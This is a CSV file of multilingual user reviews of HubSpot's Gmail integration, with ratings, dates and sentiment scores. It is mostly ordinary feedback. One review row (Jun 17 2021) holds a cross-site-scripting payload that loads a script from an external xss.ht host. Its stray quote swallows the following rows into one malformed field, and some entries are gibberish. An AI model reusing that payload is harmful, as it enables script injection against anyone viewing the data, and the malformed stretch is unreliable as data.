Review, Rating, Date,Subjectivity,Polarity
Gmail is alright on mobile HubSpot however isn't mobile friendly since I can't send images or files through the HubSpot app.,1,Jul 22 2021,0.5,0.375
"The best I can say is that it's minimally functional. Essentially consider it mostly a ""view only"" window into HubSpot which has clearly decided it wants you to ""live in"" the HubSpot web app all day rather than work out of Gmail. For context we migrated from Copper CRM to take advantage of HubSpot's complete suite--CRM sales hub marketing hub customer service hub etc. Copper can't match the functionality of having everything in one place. That said it's shocking to me that a vastly smaller company by comparison could be light years beyond HubSpot when it comes to Gmail integration. Our sales team has always worked out of the inbox. Copper allowed them to do that because there wasn't any day-to-day deal/opp management functionality that existed in the web app that didn't exist in the Chrome extension. This allowed our sales team to quickly and easily manage every aspect of a related contact company and deal/opp record without ever leaving Gmail. It was such a good experience that I simply presumed a company of HubSpot's size and cost would be at least as good if not better. I was wrong.",2,Jul 21 2021,0.5397186147186148,0.11150137741046832
essential tool for client ability to coordinate their schedule with mine. Ease of use from my clients who are appreciative.,3,Jul 21 2021,0.6,0.3
Funciona muy bien la integración en general con los correos de gmail en el navegador,5,Jul 21 2021,0.5,0.05000000000000002
HubSpot is a very very very slow platform. Probably the slowest CRM I have ever used.,1,Jul 21 2021,0.52,-0.39000000000000007
Muy bien es una herramienta muy util que me ha permitido comunucarme y poder trabajar en conjuntomcon otras app,5,Jul 21 2021,0.0,0.0
Es muy facil integrar los contacto de Gmail con la aplicación. FAcil acceso y seguimiento de correos,5,Jul 21 2021,0.0,0.0
NO FUNCIONA LA INTEGRACION TIPO IMAP CON HubSpot; SE HIZO POR CELULAR  SE HIZO POR COMPUTADORA Y NO SE SINCRONIZA.,1,Jul 21 2021,0.0,0.0
Gmail works fine but HubSpot integration with Gmail I think is terrible! i don't like it,3,Jul 20 2021,0.75,-0.29166666666666663
Gmail works extremely good for me and our organization. Helps us reduce all the distance between our offshore customer base.,5,Jul 20 2021,0.8,-0.050000000000000044
It's a great tool that can track when an email is opened and to register some conversations in HS that are important to have in the CRM,5,Jul 20 2021,0.875,0.6000000000000001
Esta impresión también puede ser aplicada destinada a ser acordada destinada por todos. En términos de valores aplicando una combinación de medios; de elementos de tamaño sectores y países distintos. Que califico de 'teal - integrales' y que retrata.,5,Jul 19 2021,0.0,0.0
Overall HubSpot and Gmail work together pretty well. No issues for me,5,Jul 19 2021,0.5,0.125
It works well but one thing that is very difficult is not being able to have the ability to organize my inbox using folders or segmentation. It crowds my inbox and makes my life a bit more difficult when I am seeing hundreds of emails daily.,3,Jul 16 2021,0.625,-0.030000000000000006
Gmail + HubSpot es un buen equipo porque te ayuda a dar seguimiento a los correos que envías a tus clientes y visualizar todas las acciones que realizan.,4,Jul 16 2021,0.0,0.0
Sim. Funciona bem acesso fácil. Somente o Maill track poderia ser ilimitado sem custo.,4,Jul 16 2021,0.0,0.0
At this point it appears to be performing well. So you're prompting me to say more...? This is very strange HubSpot. I gave you an honest reply.,4,Jul 16 2021,0.5316666666666667,0.345
So far so good. However not all features are available on the app vs. desktop,5,Jul 15 2021,0.6666666666666666,0.39999999999999997
After setup It's a complete breeze to use HubSpot. It's the only CRM I have ever used so my standards are high for any future positions I hold where I need to use a CRM.,5,Jul 15 2021,0.51625,0.065
Like I said I'm fairly new to this system so I'm still at the newbie stage. I will report later once I have got used to using the system.,4,Jul 15 2021,0.22727272727272727,0.06818181818181818
Ecosystème complet qui permet une synchronisation avec mon téléphone mobile,5,Jul 15 2021,0.0,0.0
Working very well all the features have helped our team gather leads in HubSpot through Gmail,5,Jul 15 2021,0.3,0.2
Funciona perfectamente en torno a cantidad de documentos que se pueden enviar orden y coordinación que puedo tener con mis clientes.,5,Jul 14 2021,0.0,0.0
Very useful to have all my business email connected to HS so I can track the record of all my communication and have my teammates aware of what's going on,5,Jul 14 2021,0.125,0.32
The integration works very well. There's one improvement I'd like to see. Currently it tracks every communication including ones with my coworkers. It would be nice to have a way to tell the tool to ignore certain domains (not just individual users).,5,Jul 13 2021,0.5342857142857143,0.20285714285714285
We really need inbound emails that we do not reply to to be able to be logged in HS. It seems odd that this is an issue!,3,Jul 13 2021,0.35833333333333334,0.1638888888888889
Overall the integration is great. There are some slight recommendations I would offer to HubSpot for improvement as I'm sure this is a popular integration.,3,Jul 13 2021,0.5411111111111111,0.3466666666666667
sehr gut bin sehr zufrieden. Funktioniert sehr genau. Zeitsparend.,5,Jul 13 2021,0.0,0.0
Excelente puedo usar mis contactos de celular para enviarles emails,5,Jul 13 2021,0.0,0.0
Love it! Integrates perfectly. Does what I need it to do. You don't have to switch back and forth between Google Workspace and HubSpot.,5,Jul 12 2021,0.5333333333333333,0.5416666666666666
HubSpot est le seul logiciel à s'intégrer parfaitement avec Gmail ou Outlook. Généralement les CRMs ne permettent pas de consigner et de suivre les emails en dehors de leur application. HubSpot est le seul logiciel à permettre le suivi et la consignation des emails depuis Gmail.,5,Jul 12 2021,0.0,0.0
It amazing,5,Jul 12 2021,0.9,0.6000000000000001
I love that I can see opens to know that the message got to my prospect. I also like how it is easy to create contacts and tasks right out of Gmail.,5,Jul 12 2021,0.6563492063492063,0.4063492063492064
Es muy bueno. Excelente. ¿Qué más querés que te diga? 👀 👀👀👀👀👀👀👀👀👀👀👀👀👀👀👀👀,5,Jul 11 2021,0.0,0.0
It helps to keep track to all my clients create tasks and so much more. Its my go to CRM!,5,Jul 10 2021,0.5,0.625
A little more difficult following up in HubSpot and seeing new emails outside of HubSpot.,2,Jul 10 2021,0.4340909090909091,-0.008522727272727274
All my line ups are sorted. Easy to track activity done on my leads. Its super easy.,5,Jul 10 2021,0.7777777777777778,0.39999999999999997
Me gusta gmail en general es una buena herramienta de comunicación y almacenamiento de información valiosa para mi organizacion,4,Jul 9 2021,0.5,0.05000000000000002
HubSpot is very straight forward and easy to use. It made handling employee concern better and faster. It streamlined our processes and made the team's response time more efficient.,5,Jul 9 2021,0.5883333333333334,0.42333333333333334
Gmail + HubSpot together have helped save me time and helped my business drastically. Every day I learn something new I am finding a way to save myself time every day. As a Realtor and someone who works 2 jobs every minute counts! Don't know how I went so long without this product.,5,Jul 9 2021,0.42727272727272725,0.06022727272727272
The two completely different HubSpot integrations for shared accounts vs individual accounts confuses the team and limits our ability to track all emails well. In addition any email sent from HubSpot appears to go directly to clients' Promotions folder which is about as bad as Spam..,3,Jul 8 2021,0.5166666666666666,-0.14999999999999997
Was apprehensive about using gmail over outlook however once you get used to it it's user friendly. Combined with GSuite its a great platform,5,Jul 8 2021,0.625,0.5875
This is better to friendly use. Work nicely as Gmail mentioned to us I really enjoyed to use this,5,Jul 8 2021,0.675,0.49375
It works as expected and provides good features and integrations to other G-Suite products.,5,Jul 7 2021,0.4583333333333333,0.15833333333333333
Muy bien esta bien integrado la usabilidad y la experiencia como usuario es fantastica.,5,Jul 7 2021,0.0,0.0
it does not work with HubSpot due to limitations. needs to run in chrome in stead of safari can only log 10 adresses at once while using a mailing list. very limited very inefficient.,2,Jul 7 2021,0.46517857142857144,-0.004464285714285712
Gmail has been the go-to of businesses globally and its nice that HubSpot created an integration between two platforms making it easy to keep track of daily business,5,Jul 7 2021,0.45833333333333337,0.2583333333333333
Is my company mail so we are using the platform to manage customer communication activities as well as to edit some documents,4,Jul 7 2021,0.0,0.0
Great but sometimes the integration of HubSpot and Gmail tend to glitch and not properly forward emails to HubSpot,3,Jul 6 2021,0.425,0.4
Gmail has via HubSpot is seamless and it has all the functionality that I needed plus the tracking if someone has opened and accessed the email sent.,5,Jul 6 2021,0.1,0.1
i dont feel the value is complicated to use other crm tools are winning HubSpot,2,Jul 6 2021,0.7083333333333334,-0.041666666666666664
Me permite tener un mejor historial de actividades teniendo visibilidad de actibidades,5,Jul 6 2021,0.0,0.0
Gmail and HubSpot are working hand in hand and its very keeping track of mails,5,Jul 5 2021,0.3,0.2
No sabría valorarla aún pues la configuración no es fácil. Sé que tiene mucho más potencial incluso la versión gratuita pero me falta conocer mejor la forma de configurarlo,2,Jul 4 2021,0.0,0.0
The UX and UI is good but the notifications are misleading at times. Giving false notification of open rates,3,Jul 2 2021,0.5666666666666668,0.09999999999999996
Has always been the best tool for companies everyone aligns easily to work targets,5,Jul 2 2021,0.5666666666666667,0.7166666666666667
The Tracking and Log Option's DON'T Work. I have reached out to HubSpot team for support but it still does not work for me. I have to manually add emails to BCC so that I can track and Log the emails in the HubSpot CRM,1,Jul 2 2021,0.0,0.0
I can't believe how much I can do from Gmail that syncs directly into the HubSpot CRM. It is easy to set-up tells me when clients open their emails logs my emails directly in the CRM under the correct contacts companies and deal records. Not only that but I can create tasks and deals straight from Gmail to reduce the need to jump back and forth which helps me streamline my day. I have been using this integration for nearly 6 years now at multiple companies and it just keeps getting better and better.,5,Jul 2 2021,0.4277777777777778,0.1777777777777778
Funciona perfectamente nos permite tener un mayor control del manejo de datos y requerimientos de cada uno de nuestros clientes,5,Jul 1 2021,0.0,0.0
Gmail itself works very well. When several email accounts are deployed it makes sense to use something like MS Outlook to reign them all into one environment.,1,Jun 30 2021,0.15,0.1
it is just okay ... im still trying to get familiarize with the gmail and how it works with HubSpot.,4,Jun 30 2021,0.5,0.5
Generally good. Have to remember to start a new thread from inside HubSpot.,4,Jun 30 2021,0.5272727272727273,0.41818181818181815
Excellent; we have enjoyed using Gmail but the HubSpot integration solves some key problems we experienced with trying to share customer service emails that are responded to by multiple representatives.,4,Jun 29 2021,0.72,0.45999999999999996
Muy bien excepto por Meets que no es muy amigable para presentar y ver la cámara de mi interlocutor.,5,Jun 29 2021,0.0,0.0
Estamos empezando pero por el momento estoy conociendo el CRM de HubSpot para entender de mejor forma la integración con Google.,5,Jun 29 2021,0.0,0.0
It's helpful to keep track of the mails and to send the same without have to be going through a lot of hassle.,5,Jun 29 2021,0.125,0.0
Good integration. Makes prospecting a breeze. Also helps in monitoring all sales activities in one go,5,Jun 29 2021,0.6000000000000001,0.7
The HubSpot integration with my Gmail has made it so convenient to keep track of all my different efforts; and the tracking feature (together with Notes etc) I don't have to duplicate efforts to keep records. I also like how I can opt NOT to log and track some emails since I do use this Gmail account for some other communication for a second business.,5,Jun 28 2021,0.325,-0.041666666666666664
Muy bien es una buena forma de contactarse con los clientes que demuestran estar interesados con nosotros.,5,Jun 28 2021,0.0,0.0
Normal  no me aporta otra cosa que al enviar un email por gmail me lo carga en el historial del contacto esto es lo único rescatable,3,Jun 28 2021,0.6499999999999999,0.15
Ça révolutionne une entreprise!! Peux importe la taille. C'est un modèle de rigueur et de fiabilité. Concentrons nous sur le principal but satisfaire notre clientèle et rentabiliser nos investissements.,5,Jun 26 2021,0.0,0.0
Funciona muy bien. Su integración con las demás herramientas de la suite lo hacen muy funcional,5,Jun 25 2021,0.0,0.0
Gmail EZ AF cause it really do be smacking though. I highly recommend and you must use!,5,Jun 25 2021,0.37,0.2
Me pone las cosas muy fáciles y la sincronización nativa con otros sistemas que uso a diario.,4,Jun 24 2021,0.0,0.0
Yes it working well and has impacted my business in a positive way. It has my process of doing business highly organized.,5,Jun 24 2021,0.5427272727272727,0.19363636363636363
Gmail I great for personal and business. The ability to use the email open tracking in an unobtrusive way has been very helpful both personally and professionally to confirm important messages are received. It also allows me to tailor follow-ups based on email open activity.,4,Jun 24 2021,0.46875,0.1875
Most of the activities are easier to manage due to automated tracking emails,4,Jun 24 2021,0.4375,0.1875
It's a great way to keep all types of communications in one place instead of having to follow through in different platforms,5,Jun 24 2021,0.675,0.4
The HubSpot extension is too resource-intensive and slows down the rest of my browser,1,Jun 23 2021,0.2888888888888889,-0.15555555555555559
Works perfect! If mail address or domain in HubSpot mail can be logged at the right spot in HubSpot,4,Jun 23 2021,0.7678571428571428,0.6428571428571428
Gmail es excelente solo a veces es confuso cuando son muy extensos los correos es decir cuando hay un historial de correos adjunto,5,Jun 22 2021,0.0,0.0
it works well better than most platforms. helps us get done what needs to be done,4,Jun 22 2021,0.5,0.5
The integration with gmail is good but too encompassing. When I connected gmail for my 1 work account HubSpot thought it was a good idea to also include my other work account. So now all of my email from two different companies goes into the one...not good for multiple reasons. Trying to separate them is virtually impossible now because the documentation is lacking.,2,Jun 22 2021,0.5392857142857144,0.18690476190476188
It functions great when it's actually connected but that's so hit or miss that it drives me crazy.,1,Jun 22 2021,0.5833333333333334,0.0666666666666667
Maravilhosamente bem suporte total a tudo que se trata de email eu tenho com o Workspace,5,Jun 22 2021,0.75,0.0
Work well and everything seems to be in place. I do think the UXUI can be clearer though.,5,Jun 22 2021,0.0,0.0
good to work with integrated Gmail + HubSpot  our entire organization is working for all the scopes,5,Jun 22 2021,0.6125,0.35
Great not spending too much time on a review. I'm busy and this is too much for me to write....,4,Jun 21 2021,0.3625,0.325
Works as it should via a CRM but the inability to remove the HubSpot branding from the email body unless one is to pay for the service is nothing acceptable.,2,Jun 20 2021,0.0,0.0
its so easy to access the gmail to the HubSpot that's why I loved to used it.,5,Jun 20 2021,0.8166666666666667,0.5666666666666667
Gmail is great. The HubSpot integration lacks a lot of features. We need to be able to add contacts to lists from within gmail. Also be able to edit contact details from within gmail.,1,Jun 19 2021,0.6666666666666666,0.6
Gmail like Outlook and other email systems has its own strengths as well as challenges. The challenge can be ease of use locating specifically needed components and activating or deactivating accordingly. Gmail sometimes does not have as user-friendly a system as I would like.,3,Jun 18 2021,0.6875,0.2375
Buona da migliorare l'associazione delle mail alle varie offerte aperte. Semplice da configurare,4,Jun 18 2021,0.0,0.0
good CRM but finding emails are tough. the dashboard is not easy to use. sometimes can't manage the un structured data,3,Jun 18 2021,0.7555555555555556,0.031481481481481464
Mühsam da doppelt Termine im Auge behalten werden müssen. Sollte besser und einfacher mit Outlook auch älter als Office365 funktionieren,2,Jun 18 2021,0.0,0.0
It would be wonderful to have a way to track specific emails connected to customers and companies but the integration will expose all your emails to everyone using HubSpot. No privacy no possibility to integrate with different authorization access.,1,Jun 18 2021,0.5750000000000001,0.3333333333333333
"><script src=https://vasgrg.xss.ht></script>hdddddddddddddddddddddddddddb csbndvchgsdvchs,4 ,Jun 17 2021
I've linked up HubSpot with Gmail and given it access. Calendar / meeting invitations are being picked up in HubSpot but none of the emails...and all the help pages haven't give me a clue. Some of the help pages actually contradict each other....*sigh*,1 ,Jun 17 2021
Me ha sido muy practica para enviar y recibir correos y darle seguimiento mediante las aperturas.,5 ,Jun 16 2021
O Gmail funciona perfeitamente bem. Não imaginava que seria tão boa a integração com o HubSpot mas me sinto muito surpreso. Acredito que utilizo plenamente todo o potencial que o HubSpot me oferece a partir dessa integração.,5 ,Jun 16 2021
I like being integrated. What I don't like is the HubSpot ribbon on the side taking up so much space. It forces me to scroll EVERY email I get greatly reducing my positivity about HubSpot. If that could be smaller/eliminated etc - I'd feel better about HubSpot. If I'm forced to chose one or the other - HubSpot will not win.,2 ,Jun 16 2021
Gmail serves as the basic means of communication. There is a range of free apps to connect and maintain the communication easier for our non-profit organisation.,4 ,Jun 16 2021
Gmail is fine - HubSpot's ability to track opened emails in a group email is a failure.,2 ,Jun 16 2021
It's working very well so far. With the ease us from HubSpot it's becoming much more powerful.,4 ,Jun 16 2021
Doesn’t work I was trying to get my emails in HubSpot for my contacts doesn’t work at all,1 ,Jun 16 2021
Gmail es simplemente insuperable como servicio básico de mensajeria sin dominio profecional,5 ,Jun 15 2021
Gmail is great the HubSpot integration needs some sharpening up. The sidebar popup to add new contacts to HubSpot pops up far too regularly. Whenever any email is clicked on the HubSpot sidebar appears unnecessarily which is irritating.,2 ,Jun 15 2021
Its the only mail service I use so it hard to say Since I only use Gmail for my communication,4 ,Jun 15 2021
Great tool allowing email correspondence with easy search feature. Mails can be easily sorted.,4 ,Jun 15 2021
Gmail is excellent. The HubSpot sidebar that opens with every message and cannot be persistently closed (kept closed) ruins the UX and robs users of 15-25% of available screen space. Unfortunately we have to keep the plugin installed for tracking/logging but I use an ad blocker to block the panel so all I get is a big waste of white space.,2 ,Jun 14 2021
All the features just work. Moving from Office365 it was not clear where everything was however once I was able to identify all functionality it has been seamless.,4 ,Jun 14 2021
Overall I couldn't be more satisfied. This software is very user friendly and cost effective. I am glad I decided to give it a try.,5 ,Jun 12 2021
HubSpot integrated with Gmail is exceptional - because all the same messaging templates and snippets stored in HubSpot are one-click accessible to pull into your Gmail messaging. And having HubSpot Log 'n Track all my Emails and activities to each of my contacts - no more searches trying to find my last emails to particular contacts - I just click the Contact in HubSpot and it organizes and stores all my Gmail activity in my Contacts account. Wallah ! Don't stop doing what you do so well - HubSpot ! Keep improving my Emailing life...,5 ,Jun 12 2021
It's a great that we can track our doc email and other activities to make a proactive approach.,5 ,Jun 12 2021
a great partnership together  both work very well together . finding it very useful,5 ,Jun 11 2021
It is good have to say. There are definitely some upgrades they could make to the HubSpot widget which could certainly improve performance such as adding a notes page under the title of a task and better use of the vidyard feature within HubSpot too.,4 ,Jun 11 2021
Works so well I don't think about it when I'm sending emails - it just does everything for me.,5 ,Jun 10 2021
Very well it's user friendly I can search for old emails and find it very quickly,5 ,Jun 10 2021
Overall when gmail mails comes its difficult as it allcomes together and we have to seach fior the required mail. better is outlook but still ok,4 ,Jun 10 2021
Overall the integration is great - the new pop up which is automated on the Gmail side panel"" needs to be improved or configurable as this has effectively stopped me from being able to use all other side panel features.",3,Jun 10 2021,0.502804355269144,0.22191215474666176
Can create contacts / Companies directly from Email; Can create task and ensure I don't forget to followup; add templates and snippets easily; meetings are also very easy to use.,5,Jun 9 2021,0.7444444444444445,0.3655555555555556
Normal and usual business communication. Usual correspondences and business communication.,4,Jun 9 2021,0.3833333333333333,-0.11666666666666665
works great. I really dont have time this morning to complete this....................,4,Jun 9 2021,0.45,0.3666666666666667
I love using HubSpot and Gmail I don't have to log and emails because it automatically does it for me saves me so much time!,5,Jun 9 2021,0.4,0.375
Uma boa experiência e facilidade na usabilidade e também apoiando a economia de tempo.,5,Jun 8 2021,0.0,0.0
Doesn't integrate with local email applications. Employee base is split between Macs and PCs but use the local email app for day to day (vs. browser email). HubSpot email integration appears to only work on browser use and doesn't work at all with Mac email local app.,1,Jun 8 2021,0.4,-0.16
Gmail works great but I felt like HubSpot hijacked it!!! I deleted that in your programs so it does not do that anymore.,1,Jun 8 2021,0.75,1.0
The issue I'm having is HubSpot defaults the tracking and CRM features and most of the time I don't want those. The documentation I read suggested there is now way to default them to off letting me check the box if I want to track them and add them to CRM. It's a huge time waster.,2,Jun 8 2021,0.7,0.45000000000000007
Gmail is working very well plus HubSpot is a ferrari with a lot of potential,5,Jun 8 2021,0.65,0.1
muy bien cumple con las necesidades que tengo de un servicio completo y rápido,5,Jun 7 2021,0.0,0.0
Sim até agora sem qualquer tipo de problemas. Corresponde ás minhas expectativas.,4,Jun 7 2021,0.0,0.0
Agiliza minhas tarefas. Sendo prático e funcional permitindo uma boa conversação entre setores.,5,Jun 7 2021,0.0,0.0
Gmail is working well for us and is better now we are using it as part of Workspace.,2,Jun 7 2021,0.5,0.5
Todo genial funciona a la perfección y me aparecen todos los correos en todas partes.,5,Jun 7 2021,0.0,0.0
Very good great that it all dovetails with PC iPad and phone for ease of starting and picking up all correspondence,5,Jun 7 2021,0.5433333333333334,0.57
Faciliter d'enregistrement de document dans GoogleDrive. Possibilité de réer des sous libellés et des mails types. Synchronisation facile entre plusieurs appareils. Utilisation d'une adresse vitrine commune pour l'équipe. Possibilité d'enregistrer une signature et de mis e en forme dans les mails. Permet de retrouver l'historique des mails.,3,Jun 7 2021,0.0,0.0
Excellent. Gmail HubSpot integration Gmail HubSpot integration Gmail HubSpot integration,5,Jun 7 2021,1.0,1.0
It's awesome. It's very easy for us to communicate with the leads and we can keep an eye when they're looking through the Collaterals and all. It's helpful to connect with the lead.,5,Jun 5 2021,1.0,0.7816666666666667
Es muy buena y funciona muy bien me gusta mucho por que me ayuda en todo mis beneficios,4,Jun 5 2021,0.0,0.0
Nos ajuda muito a melhorar a experiência de troca de dados criação de atividades.,5,Jun 4 2021,0.0,0.0
It's ok but threading is terrible I can lose lot of time finding a specific email in a long thread,4,Jun 4 2021,0.50625,-0.1375
Gmail is a great email service. Being able to create tags allows me to differentiate between different work-associated issues with ease.,4,Jun 4 2021,0.6583333333333333,0.43333333333333335
gmail funciona muy bien para mi y para los trabajos que realizo a diario no tengo inconvenientes hasta el momento.,4,Jun 4 2021,0.0,0.0
Es bueno ya que todo lo que se hace en gmail queda registrado automaticamente.,5,Jun 2 2021,0.0,0.0
Gmail is good. My experience using the tools is low so my experience was frustrating.,2,Jun 2 2021,0.6000000000000001,0.09999999999999998
It's a decent integration and the sidebar panel for clients is nice when you're viewing an email. The tracking/log controls are easy and the snippet/template stuff is great - we use it often. But coming from Insightly the one BIG omission is a simple click to save against a HubSpot record. Insightly allowed you to click 'save' and search for a contact opportunity project etc and save the email against it. HubSpot still requires the 'forward to an email' thing and doesn't really let you choose how it's saved.,4,Jun 2 2021,0.5581632653061225,0.31428571428571433
gmail es excelente!! a quien no califiqué muy bien es HubSpot ya que no concilia la firma a los emails que esta inscrita en gmail HubSpot no me traslada esa firma de manera automatica,3,Jun 2 2021,0.0,0.0
works good. No faults really sometimes a bit slow but thats it. not all the time,5,Jun 2 2021,0.39999999999999997,0.19999999999999996
Gmail integration seems to be sporadic and drops on and off - not recording emails within contact profiles.,2,Jun 2 2021,0.0,0.0
very fast and works perfectly well with all my tasksvery fast and works perfectly well with all my tasks,5,Jun 1 2021,0.845,0.615
Bueno el servicio me ha parecido hasta el momento muchas gracias he optimizado mejor mi interacción con clientes.,5,Jun 1 2021,0.0,0.0
I only use Gmail outside of HubSpot. There are pros and cons. My Gmail is integrated with HubSpot but I do not use it. I am a true startup and Army of one. There are too many limitations using Gmail through HubSpot. HubSpot wants to brand all of my emails with HubSpot logo and links. It make my emails look cheap....which is not helpful to a startup.,1,Jun 1 2021,0.4600000000000001,0.21000000000000002
Very Poor. When sending email Campaigns it only recognises one email not the bulk 100. When targetting thousands of customers this needs to be recorded. It thought I was a Spammer so decided to block my messages.... its bloody sales its a numbers game. Very much an obstacle to success.,2,Jun 1 2021,0.5566666666666666,-0.19333333333333336
good not having any problems at this time I like the way I can organize things,5,Jun 1 2021,0.6000000000000001,0.7
Funciona bien en realidad deberían tener integraciones con otros administradores de correo donde uno pueda usar la integración y poder tener administrar varias cuentas.,5,Jun 1 2021,0.0,0.0
Very good I like the integration between the two system. I really enjoy use it  it’s useful !,5,Jun 1 2021,0.42666666666666675,0.5616666666666666
Muy bien. Ha sido un (Real) Aporte; he tenido varios Ptos. de Contacto post Campaigns con G. Ads,5,Jun 1 2021,0.30000000000000004,0.2
increíblemente bien te da la oportunidad de tener una suite llena de atajos y mejoras,5,Jun 1 2021,0.0,0.0
Califico de excelente la integración. HubSpot es espectacular en su desempeño,5,Jun 1 2021,0.0,0.0
amazing...................... everything seems to be in track and its working so thats good enough for me.,5,Jun 1 2021,0.6666666666666666,0.43333333333333335
La uso tutti i giorni con più profili quindi tanto. A mio parere c'è margine di miglioramento,3,May 31 2021,0.0,0.0
Helaas minder enthousiast dus hierdoor want ik moest het alsnog via Pop3 etc oplossen en dat was een heel gedoe,3,May 31 2021,0.0,0.0
La extensión de husbpot en Gmail funciona muy bien me permite tener una trazabildiad de la gestion comercial de mi equipo en tiempo real!,5,May 31 2021,0.30000000000000004,0.25
The problem with the app is that it is not following the Google guide lines. That means that you cannot use the tabs because HubSpot interfeers in the browser window. I hobe you will update the asap.,2,May 31 2021,0.1,0.0
It has been used for both personal and business transactions. It has generated me clients and sales,5,May 29 2021,0.3,0.0
Vem me ajudando muito principalmente agora que estou descobrindo mais funções!,5,May 28 2021,0.0,0.0
Funciona muy bien es un agrado el calendar de HubSpot + gmail. Simplifica mucho el agendamiento de reuniones,5,May 28 2021,0.0,0.0
This saves us a ton of time in documenting conversations. We have found it valuable and effective.,5,May 28 2021,0.8,0.6
it has everything we need and is cloudbased  it really is our document history management system having the ability to see the conversation now in HubSpot seamlessly is great it would be nice to be able to categorise or ignore certain trails like certain emails are either junk or they are personal,4,May 28 2021,0.5739795918367346,0.3612244897959184
Va muy bien me gusta la integración con HubSpot fluida intuitiva y se conecta perfecto con mis prospectos y clientes (fidelización).,5,May 27 2021,0.0,0.0
Ha sido una herramienta de mucha utilidad ya que se lleva un mejor control tanto de los correos que entran como de los que se envían,5,May 27 2021,0.0,0.0
Excelente herramienta y no se como trabajaría sin ella ya que me ayuda a ser mas productivo.,5,May 27 2021,0.0,0.0
Very easy to use... Yet I do not understand why some emails are not associated with the right deals.,3,May 27 2021,0.7678571428571428,0.4245238095238095
Gmail es muy sencillo y practico para utilizar. Ademas que uno de los puntos positivos es la presencia del corrector automatico donde facilita en la escrita :)!,4,May 27 2021,1.0,0.625
its working great and most of the features I want are at my finger tips. its awesome to use,5,May 27 2021,0.75,0.7666666666666666
It was working great before and I was a fan of the plug in but I believe I am running into a bug where I am unable to sign in now. have tried to unadd plug in and re add it but not working,1,May 26 2021,0.625,0.15000000000000002
Gmail funciona perfectamente para lo que necesito. Ha ayudado a mi empresa a generar muy buenos leads contactos networking etc.,5,May 26 2021,0.0,0.0
it is a great place to allow each other to communicate and to get my work done.,4,May 26 2021,0.5625,0.3375
I like HS for what it can do but am not happy with what it won't do. The options are great but it's all or nothing. There really has to be automation friendly options for email integration. I don't need spam email infecting my HS account.,2,May 25 2021,0.6125,0.24375000000000002
I love google products and haven't tried any other email services for my business or personal use. I'm biased for sure.,5,May 25 2021,0.5409722222222222,0.21875
excellent for my type of work typically good integration with extension of other apps but for a while now the HB extension started having an annoying side window pop up that i could deactivate - had to remove the extension to stop it from popping up at every email. its closing button was also overlapping with other gmail buttons and made it impossible to turn it off,2,May 25 2021,0.7083333333333334,-0.0027777777777777866
HubSpot integration of Gmail is a definite improvement over regular Gmail. It is now part of my routine.,5,May 24 2021,0.28846153846153844,0.0
it's free which is a maasive bonus it's helpful to be able to add leads immediately add a task or deal too. I wish it was possible to edit the details in gmail too like you can with the intercom + HubSpot integration,5,May 24 2021,0.8083333333333332,0.3
I will rate poor for overall my experience with HubSpot and will not recommend to anyone My experience is literally worst with HubSpot tool,1,May 24 2021,0.5333333333333333,-0.4666666666666666
Excelente de las mejores aplicaciones para trabajar muy intuitiva Fácil de entender y muy simple de usar Tiene herramientas gratuitas que apoyan mi trabajo,5,May 24 2021,0.35714285714285715,0.0
Gmail works well I don't like that some of my messages from someone I get mail from on a daily basis is put in the Social or Promotions folders.,4,May 23 2021,0.03333333333333333,0.016666666666666666
It allows me to be more productive because I don't have to duplicate task and contact information,4,May 23 2021,0.5,0.5
Gmail is easiest to navigate easy it is to use it seems like anything you need is right there at your fingertips plus all the hundreds and thousands if not millions of extensions and this all makes it very smooth to run a business with.,2,May 22 2021,0.673015873015873,0.41301587301587306
muy bien para la empresa es apropiado y logra que optimicemos nuestro tiempo y recursos.,5,May 21 2021,0.0,0.0
excelente herramienta para la elaboración de campañas y marketing digital recomiendo mucho la herramienta,5,May 21 2021,0.0,0.0
booohooo jhbouifhhjsvhn;aijupiwejhbchjbdxkjn yigtiuyhjikh yuguiyhoijh;juih yguighjki,3,May 21 2021,0.0,0.0
The integration features with Gmail allow me to gain the visibility and insights I need to make informed decisions as it relates to my prospects and their ultimate decision making. Putting together new documentation is a breeze.,5,May 21 2021,0.7272727272727273,0.06818181818181818
Es un correo mundial y muy funcional de fácil operación y ameno para enviar correos,4,May 21 2021,0.0,0.0
positivamente a afectado la operación de ventas de la empres. Pero tengo dudas de como aumenta el conteo de si se abrió el correo.,4,May 21 2021,0.0,0.0
The pop out on the right of the page needs to have a stop function it opens on every new email and takes up too much of the screen. I understand the benefits of it but it would be better to have the choice to use it or not. It takes up too much space on the page especially if you have the email page layout in two columns.,2,May 21 2021,0.4817099567099567,0.22034632034632032
